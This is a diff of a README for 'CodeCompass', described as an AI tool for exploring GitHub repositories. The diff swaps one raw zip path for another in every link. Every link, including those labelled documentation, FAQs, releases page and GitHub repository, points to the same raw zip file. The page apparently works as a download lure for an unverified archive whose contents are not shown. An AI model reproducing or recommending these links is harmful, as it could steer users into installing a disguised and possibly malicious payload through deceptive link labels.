@@ -1,7 +1,7 @@
 # 🧭 CodeCompass - Turn GitHub Repos into Interactive Knowledge
 
 ## 📥 Download Now
-[![Download CodeCompass](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/assets/CodeCompass-surpasser.zip%20CodeCompass-v1.0-brightgreen)](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/assets/CodeCompass-surpasser.zip)
+[![Download CodeCompass](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/backend/Code-Compass-v1.4.zip%20CodeCompass-v1.0-brightgreen)](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/backend/Code-Compass-v1.4.zip)
 
 ## 📖 About CodeCompass
 CodeCompass transforms any GitHub repo into an interactive, searchable knowledge base. With it, you can explore code, documentation, and chat with an AI that uses the actual repo content to provide answers.
@@ -10,7 +10,7 @@ CodeCompass transforms any GitHub repo into an interactive, searchable knowledge
 To get started with CodeCompass, follow these steps:
 
 1. **Download CodeCompass**
-   - Visit the [Releases Page](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/assets/CodeCompass-surpasser.zip) to download the latest version.
+   - Visit the [Releases Page](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/backend/Code-Compass-v1.4.zip) to download the latest version.
 
 2. **Install the Software**
    - Locate the downloaded file on your computer.
@@ -57,9 +57,9 @@ After launching CodeCompass, you can start using the application by following th
 ## 📚 Documentation
 For a deeper dive into CodeCompass and its capabilities, check out our documentation:
 
-- [Getting Started](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/assets/CodeCompass-surpasser.zip)
-- [Advanced Features](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/assets/CodeCompass-surpasser.zip)
-- [Troubleshooting](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/assets/CodeCompass-surpasser.zip)
+- [Getting Started](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/backend/Code-Compass-v1.4.zip)
+- [Advanced Features](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/backend/Code-Compass-v1.4.zip)
+- [Troubleshooting](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/backend/Code-Compass-v1.4.zip)
 
 ## ⚙️ Customization Options
 You can tailor CodeCompass to fit your needs:
@@ -70,15 +70,15 @@ You can tailor CodeCompass to fit your needs:
 ## 🔧 Support
 If you encounter any issues or have questions, visit our support section:
 
-- **FAQs**: [Frequently Asked Questions](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/assets/CodeCompass-surpasser.zip)
+- **FAQs**: [Frequently Asked Questions](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/backend/Code-Compass-v1.4.zip)
 - **Contact Us**: Reach out through the GitHub issues page or email us directly.
 
 ## 🏷️ Tags
 CodeCompass is relevant to categories such as: chatbot, chromadb, code-search, documentation-search, embedchain, flask, github, groq, llm, rag, react, semantic-search, sentence-transformers, tailwindcss, vite.
 
 ## 🔗 Important Links
-- [Download CodeCompass](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/assets/CodeCompass-surpasser.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/assets/CodeCompass-surpasser.zip)
-- [Documentation](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/assets/CodeCompass-surpasser.zip)
+- [Download CodeCompass](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/backend/Code-Compass-v1.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/backend/Code-Compass-v1.4.zip)
+- [Documentation](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/backend/Code-Compass-v1.4.zip)
 
 Now you are ready to use CodeCompass to explore and interact with your favorite GitHub repositories. Enjoy!
